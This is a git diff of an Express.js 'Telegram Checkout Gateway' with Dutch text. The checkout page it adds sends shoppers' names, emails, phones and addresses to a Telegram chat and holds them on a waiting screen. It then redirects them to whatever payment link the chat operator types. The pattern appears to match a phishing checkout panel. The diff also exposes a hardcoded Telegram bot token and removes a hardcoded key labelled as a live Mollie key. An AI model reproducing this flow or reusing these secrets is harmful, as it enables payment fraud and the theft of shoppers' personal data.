@@ -15,10 +15,6 @@ app.use(express.static('public'));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8514021592:AAGb8cpda9C03BYreg6kVL5zvUMyAk-FGMM';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1770424979';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
-// Mollie credentials
-const MOLLIE_API_KEY = process.env.MOLLIE_API_KEY || 'live_hPsaMzWV92ufHVSdrJVCs7UUBjj4Hz';
-const MOLLIE_BASE_URL = 'https://api.mollie.com/v2';
 const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
 
 // In-memory storage voor sessions
@@ -28,7 +24,7 @@ const pendingSessions = new Map();
 app.get('/', (req, res) => {
   res.json({ 
     status: 'active',
-    message: 'Telegram Bot Checkout Gateway is running',
+    message: 'Telegram Checkout Gateway is running',
     timestamp: new Date().toISOString()
   });
 });
@@ -39,21 +35,13 @@ app.get('/health', (req, res) => {
 });
 
 // Send message to Telegram
-async function sendTelegramMessage(text, sessionId = null) {
+async function sendTelegramMessage(text) {
   try {
-    const keyboard = sessionId ? {
-      inline_keyboard: [[
-        { text: '✅ Betaallink versturen', callback_data: `pay_${sessionId}` }
-      ]]
-    } : null;
-
     const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: text,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
+      parse_mode: 'HTML'
     });
-    
     return response.data;
   } catch (error) {
     console.error('Error sending Telegram message:', error.message);
@@ -66,7 +54,7 @@ app.get('/checkout', async (req, res) => {
   const { amount, currency, order_id, return_url, cart_items } = req.query;
   
   if (!amount || !currency) {
-    return res.status(400).send('Verplichte parameters ontbreken: bedrag en valuta');
+    return res.status(400).send('Verplichte parameters ontbreken');
   }
 
   let cartData = null;
@@ -163,14 +151,28 @@ app.get('/checkout', async (req, res) => {
             background: #d9d9d9;
             cursor: not-allowed;
           }
-          .success {
-            background: #e8f5e9;
-            border: 1px solid #4caf50;
-            color: #2e7d32;
-            padding: 16px;
-            border-radius: 5px;
-            margin-top: 20px;
+          .waiting {
+            text-align: center;
+            padding: 40px;
             display: none;
+          }
+          .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2c6ecb;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+          }
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+          .waiting-text {
+            font-size: 18px;
+            color: #666;
+            margin-top: 20px;
           }
           .error {
             background: #ffebee;
@@ -185,66 +187,72 @@ app.get('/checkout', async (req, res) => {
       </head>
       <body>
         <div class="container">
-          <h1>📋 Klantgegevens</h1>
-          <div class="amount">€${amount}</div>
-          
-          <div id="error-message" class="error"></div>
-          <div id="success-message" class="success"></div>
-          
-          <form id="customer-form">
-            <div class="form-row">
-              <div class="form-group">
-                <label for="firstName">Voornaam *</label>
-                <input type="text" id="firstName" required>
+          <div id="form-container">
+            <h1>📋 Klantgegevens</h1>
+            <div class="amount">€${amount}</div>
+            
+            <div id="error-message" class="error"></div>
+            
+            <form id="customer-form">
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="firstName">Voornaam *</label>
+                  <input type="text" id="firstName" required>
+                </div>
+                <div class="form-group">
+                  <label for="lastName">Achternaam *</label>
+                  <input type="text" id="lastName" required>
+                </div>
               </div>
+              
               <div class="form-group">
-                <label for="lastName">Achternaam *</label>
-                <input type="text" id="lastName" required>
+                <label for="email">E-mailadres *</label>
+                <input type="email" id="email" required>
               </div>
-            </div>
-            
-            <div class="form-group">
-              <label for="email">E-mailadres *</label>
-              <input type="email" id="email" required>
-            </div>
-            
-            <div class="form-group">
-              <label for="phone">Telefoonnummer *</label>
-              <input type="tel" id="phone" required>
-            </div>
-            
-            <div class="form-group">
-              <label for="address">Adres *</label>
-              <input type="text" id="address" required>
-            </div>
-            
-            <div class="form-row">
+              
               <div class="form-group">
-                <label for="postalCode">Postcode *</label>
-                <input type="text" id="postalCode" required>
+                <label for="phone">Telefoonnummer *</label>
+                <input type="tel" id="phone" required>
               </div>
+              
               <div class="form-group">
-                <label for="city">Plaats *</label>
-                <input type="text" id="city" required>
+                <label for="address">Adres *</label>
+                <input type="text" id="address" required>
               </div>
+              
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="postalCode">Postcode *</label>
+                  <input type="text" id="postalCode" required>
+                </div>
+                <div class="form-group">
+                  <label for="city">Plaats *</label>
+                  <input type="text" id="city" required>
+                </div>
+              </div>
+              
+              <button type="submit" class="submit-button">
+                Ga verder
+              </button>
+            </form>
+          </div>
+
+          <div id="waiting-container" class="waiting">
+            <div class="spinner"></div>
+            <div class="waiting-text">
+              Een moment geduld...<br>
+              We verwerken je gegevens
             </div>
-            
-            <button type="submit" class="submit-button">
-              Gegevens verzenden
-            </button>
-          </form>
+          </div>
         </div>
 
         <script>
           const cartData = ${cartData ? JSON.stringify(cartData) : 'null'};
           const sessionId = '${sessionId}';
+          let pollingInterval = null;
 
           document.getElementById('customer-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
-            const button = document.querySelector('.submit-button');
-            button.disabled = true;
-            button.textContent = 'Verzenden...';
             
             const customerData = {
               firstName: document.getElementById('firstName').value.trim(),
@@ -256,7 +264,20 @@ app.get('/checkout', async (req, res) => {
               city: document.getElementById('city').value.trim()
             };
             
+            // Validate
+            if (!customerData.firstName || !customerData.lastName || !customerData.email || 
+                !customerData.phone || !customerData.address || !customerData.postalCode || !customerData.city) {
+              document.getElementById('error-message').style.display = 'block';
+              document.getElementById('error-message').innerHTML = '✗ Vul alle velden in';
+              return;
+            }
+
+            // Show waiting screen
+            document.getElementById('form-container').style.display = 'none';
+            document.getElementById('waiting-container').style.display = 'block';
+            
             try {
+              // Send customer data
               const response = await fetch('/api/submit-customer-info', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -274,20 +295,44 @@ app.get('/checkout', async (req, res) => {
               const data = await response.json();
               
               if (data.status === 'success') {
-                document.getElementById('success-message').style.display = 'block';
-                document.getElementById('success-message').innerHTML = 
-                  '✅ Gegevens verzonden! Je ontvangt binnen enkele momenten een betaallink.';
-                document.getElementById('customer-form').style.display = 'none';
+                // Start polling for payment link
+                startPolling();
               } else {
                 throw new Error(data.message || 'Er ging iets mis');
               }
             } catch (error) {
+              document.getElementById('form-container').style.display = 'block';
+              document.getElementById('waiting-container').style.display = 'none';
               document.getElementById('error-message').style.display = 'block';
               document.getElementById('error-message').innerHTML = '✗ ' + error.message;
-              button.disabled = false;
-              button.textContent = 'Gegevens verzenden';
             }
           });
+
+          function startPolling() {
+            // Poll every 2 seconds for payment link
+            pollingInterval = setInterval(async () => {
+              try {
+                const response = await fetch('/api/check-payment-link/' + sessionId);
+                const data = await response.json();
+                
+                if (data.status === 'ready' && data.paymentLink) {
+                  clearInterval(pollingInterval);
+                  window.location.href = data.paymentLink;
+                }
+              } catch (error) {
+                console.error('Polling error:', error);
+              }
+            }, 2000);
+
+            // Stop polling after 10 minutes
+            setTimeout(() => {
+              if (pollingInterval) {
+                clearInterval(pollingInterval);
+                document.getElementById('waiting-container').innerHTML = 
+                  '<p style="color: #c62828;">⏱️ Time-out. Probeer het opnieuw.</p>';
+              }
+            }, 600000);
+          }
         </script>
       </body>
     </html>
@@ -301,6 +346,7 @@ app.post('/api/submit-customer-info', async (req, res) => {
     
     console.log('Customer info received:', customerData);
     
+    // Store session
     pendingSessions.set(sessionId, {
       customerData,
       cartData,
@@ -308,9 +354,11 @@ app.post('/api/submit-customer-info', async (req, res) => {
       currency,
       orderId,
       returnUrl,
+      paymentLink: null,
       created_at: new Date()
     });
     
+    // Build products list
     let productsText = '';
     if (cartData && cartData.items) {
       productsText = '\n\n<b>🛒 Producten:</b>\n';
@@ -319,6 +367,7 @@ app.post('/api/submit-customer-info', async (req, res) => {
       });
     }
     
+    // Send to Telegram
     const message = `
 <b>🔔 NIEUWE BESTELLING</b>
 
@@ -333,16 +382,20 @@ Adres: ${customerData.address}
 Postcode: ${customerData.postalCode}
 Plaats: ${customerData.city}${productsText}
 
-<b>Session ID:</b> <code>${sessionId}</code>
+<b>🔑 Session ID:</b> <code>${sessionId}</code>
 
-Klik op de knop hieronder om de betaallink te versturen.
+<b>Stuur betaallink:</b>
+<code>/pay ${sessionId} [jouw-betaallink]</code>
+
+Voorbeeld:
+<code>/pay ${sessionId} https://mollie.com/checkout/xyz123</code>
     `.trim();
     
-    await sendTelegramMessage(message, sessionId);
+    await sendTelegramMessage(message);
     
     res.json({
       status: 'success',
-      message: 'Gegevens verzonden naar Telegram'
+      message: 'Gegevens verzonden'
     });
     
   } catch (error) {
@@ -354,71 +407,57 @@ Klik op de knop hieronder om de betaallink te versturen.
   }
 });
 
+// Check payment link (polling endpoint)
+app.get('/api/check-payment-link/:sessionId', (req, res) => {
+  const { sessionId } = req.params;
+  const session = pendingSessions.get(sessionId);
+  
+  if (!session) {
+    return res.json({ status: 'not_found' });
+  }
+  
+  if (session.paymentLink) {
+    return res.json({
+      status: 'ready',
+      paymentLink: session.paymentLink
+    });
+  }
+  
+  res.json({ status: 'waiting' });
+});
+
 // Telegram webhook
-app.post(`/webhook/telegram`, async (req, res) => {
+app.post('/webhook/telegram', async (req, res) => {
   try {
     const update = req.body;
-    console.log('Telegram webhook:', JSON.stringify(update, null, 2));
+    console.log('Telegram update:', JSON.stringify(update, null, 2));
     
-    if (update.callback_query) {
-      const callbackData = update.callback_query.data;
+    // Handle text messages
+    if (update.message && update.message.text) {
+      const text = update.message.text.trim();
       
-      if (callbackData.startsWith('pay_')) {
-        const sessionId = callbackData.replace('pay_', '');
-        const session = pendingSessions.get(sessionId);
+      // Check if it's a /pay command
+      if (text.startsWith('/pay ')) {
+        const parts = text.split(' ');
         
-        if (!session) {
-          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-            callback_query_id: update.callback_query.id,
-            text: '❌ Sessie verlopen of niet gevonden'
-          });
-          return res.send('OK');
+        if (parts.length >= 3) {
+          const sessionId = parts[1];
+          const paymentLink = parts.slice(2).join(' ');
+          
+          const session = pendingSessions.get(sessionId);
+          
+          if (session) {
+            // Store payment link
+            session.paymentLink = paymentLink;
+            pendingSessions.set(sessionId, session);
+            
+            await sendTelegramMessage(`✅ Betaallink ingesteld voor sessie ${sessionId}\n\nKlant wordt doorgestuurd naar:\n${paymentLink}`);
+          } else {
+            await sendTelegramMessage(`❌ Sessie ${sessionId} niet gevonden of verlopen`);
+          }
+        } else {
+          await sendTelegramMessage(`❌ Gebruik: /pay [session_id] [betaallink]`);
         }
-        
-        const paymentData = {
-          amount: {
-            currency: session.currency.toUpperCase(),
-            value: parseFloat(session.amount).toFixed(2)
-          },
-          description: `Bestelling ${session.orderId || sessionId}`,
-          redirectUrl: session.returnUrl || `${APP_URL}/payment/success`,
-          metadata: {
-            session_id: sessionId,
-            customer_email: session.customerData.email
-          }
-        };
-        
-        const paymentResponse = await axios.post(
-          `${MOLLIE_BASE_URL}/payments`,
-          paymentData,
-          {
-            headers: {
-              'Authorization': `Bearer ${MOLLIE_API_KEY}`,
-              'Content-Type': 'application/json'
-            }
-          }
-        );
-        
-        const payment = paymentResponse.data;
-        const paymentUrl = payment._links.checkout.href;
-        
-        const confirmMessage = `
-✅ <b>Betaallink aangemaakt!</b>
-
-💳 Betaallink:
-${paymentUrl}
-
-<b>Klant:</b> ${session.customerData.email}
-
-Stuur deze link naar de klant.
-        `.trim();
-        
-        await sendTelegramMessage(confirmMessage);
-        
-        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
-          callback_query_id: update.callback_query.id,
-          text: '✅ Betaallink aangemaakt!'
-        });
       }
     }
     
@@ -427,48 +466,6 @@ Stuur deze link naar de klant.
     console.error('Webhook error:', error);
     res.send('OK');
   }
-});
-
-// Payment success
-app.get('/payment/success', (req, res) => {
-  res.send(`
-    <html>
-      <head>
-        <title>Betaling Geslaagd</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background: #f7f7f7;
-          }
-          .box {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-          }
-          .checkmark {
-            color: #4CAF50;
-            font-size: 60px;
-            margin-bottom: 20px;
-          }
-          h1 { color: #333; }
-          p { color: #666; line-height: 1.6; }
-        </style>
-      </head>
-      <body>
-        <div class="box">
-          <div class="checkmark">✓</div>
-          <h1>Betaling Geslaagd!</h1>
-          <p>Bedankt voor je bestelling.</p>
-          <p>Je ontvangt een bevestiging per e-mail.</p>
-        </div>
-      </body>
-    </html>
-  `);
 });
 
 // Set webhook
@@ -498,7 +495,6 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📍 App URL: ${APP_URL}`);
   console.log(`🤖 Telegram Bot configured`);
-  console.log(`💳 Mollie configured`);
   console.log('');
   console.log(`📝 Set webhook: ${APP_URL}/set-webhook`);
 });
